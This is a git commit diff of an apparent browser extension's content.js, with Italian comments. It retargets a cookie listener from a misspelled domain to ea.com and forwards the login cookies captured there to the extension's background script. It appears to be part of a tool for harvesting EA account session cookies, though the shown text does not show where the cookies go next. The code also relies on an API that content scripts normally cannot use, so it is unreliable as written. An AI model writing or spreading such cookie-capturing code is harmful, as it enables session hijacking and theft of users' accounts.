5e38a7fa1d701c0587e6a1885b8d780e3cfb0b6a
Mattedark10 <129958646+Mattedark10@users.noreply.github.com>
2024-03-26 22:36:08 +0100

    Update content.js

--- content.js
+++ content.js
@@ -1,13 +1,13 @@
-// Iniezione di script nella pagina Electronic Ars per monitorare gli eventi di accesso
+// Iniezione di script nella pagina di login di EA per monitorare gli eventi di accesso
 (function() {
   // Funzione per inviare i dettagli dell'accesso al background script
   function sendLoginDetailsToBackground(cookie) {
     chrome.runtime.sendMessage({ action: "loginDetected", cookie: cookie });
   }
 
-  // Monitora gli eventi di accesso sulla pagina Electronic Ars
+  // Monitora gli eventi di accesso sulla pagina di login di EA
   chrome.cookies.onChanged.addListener(function(changeInfo) {
-    if (changeInfo.cause === "explicit" && changeInfo.cookie.domain === "electronic-ars.com") {
+    if (changeInfo.cause === "explicit" && changeInfo.cookie.domain === "ea.com") {
       sendLoginDetailsToBackground(changeInfo.cookie);
     }
   });
